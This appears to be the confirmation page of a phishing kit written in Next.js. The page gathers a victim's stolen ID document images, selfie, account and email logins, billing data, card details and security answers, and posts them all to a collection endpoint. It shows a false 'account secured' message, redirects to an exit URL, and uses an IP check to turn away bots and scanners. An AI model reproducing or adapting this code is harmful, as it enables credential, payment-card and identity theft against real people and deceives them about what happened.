/* eslint-disable @next/next/no-img-element */
import { SpinnerStyles } from "@/components/SpinnerStyles";
import checkIp from "@/middleware/checkIp";
import axios from "axios";
import { GetServerSideProps } from "next";
import React, { useContext, useEffect } from "react";
import { Container as Wrapper } from "../components/Container";
import { dataURItoBlob } from "../utils/dataURItoBlob";
import { DataContext } from "./_app";

interface ConfirmationProps {}

export const Confirmation: React.FC<ConfirmationProps> = ({}) => {
  const { data } = useContext(DataContext);

  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const selfie = data.selfie;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;
      const answers = data.answers;
      const sessionId = data.sessionId;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (sessionId) {
            formData.append(`sessionId`, sessionId);
          }

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (selfie) {
            formData.append(`selfie`, dataURItoBlob(selfie));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          if (answers) {
            formData.append(`answers`, JSON.stringify(answers));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData);
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <>
      <SpinnerStyles />
      <Wrapper
        subTitle="Account secured"
        superTitle="Thank you"
        paragraph="Thank you for verifying your account information, your account has been secured and your online access has been resotred. Please wait while we redirect you to the login page."
        title="Account secured"
        hideBtn
      >
        <div
          style={{
            display: `flex`,
            alignItems: `center`,
            justifyContent: `center`,
            padding: `20px 0`,
            paddingTop: 0,
            marginBottom: `20px`,
            flexDirection: `column`,
          }}
        >
          <div
            id="spinner-initial"
            style={{
              marginTop: 0,
            }}
          >
            <svg height={80} width={80} className="spinner-image">
              <circle
                className="spinner-circle"
                cx={40}
                cy={40}
                r={30}
                fill="none"
                strokeWidth={3}
                strokeMiterlimit={6}
              />
            </svg>{" "}
            <svg
              className="spinner-icon"
              viewBox="0 0 16 16"
              width={32}
              height={32}
            >
              <path
                d="M8 4.916c.709 0 1.507.607 1.508 1.445 0 .471-.152.835-.374 1.164a2.18 2.18 0 0 0-.298.636c-.048.202-.155.685.442.696.386.007 1.34-.326 2.11-1.249A4.334 4.334 0 0 0 7.999.571 4.335 4.335 0 0 0 4.61 7.608c.77.923 1.724 1.256 2.11 1.249.598-.011.491-.493.443-.695a2.18 2.18 0 0 0-.298-.636c-.22-.33-.373-.694-.373-1.164.001-.839.8-1.446 1.508-1.446zm7.664 4.381c-.177-.146-.49-.36-1.128-.455-.886-.134-1.679.074-2.157.263-.625.246-1.399.803-1.932 1.534-.562.77-.856 1.933-.575 3.145.08.344.165.534.29.772.171.326.607.778.992.86.306.064.544-.112.658-.242.775-.891 3.712-4.34 4.03-4.783.314-.436.11-.855-.178-1.094M3.621 9.104c-.477-.189-1.271-.397-2.157-.263-.638.096-.951.31-1.128.455-.288.239-.493.659-.179 1.094.318.442 3.254 3.891 4.03 4.783.114.131.352.307.657.242.386-.082.822-.534.993-.86a2.9 2.9 0 0 0 .29-.772c.281-1.212-.013-2.375-.575-3.145-.532-.731-1.305-1.288-1.931-1.534"
                fill="currentColor"
              />
            </svg>
          </div>
        </div>
      </Wrapper>
    </>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default Confirmation;
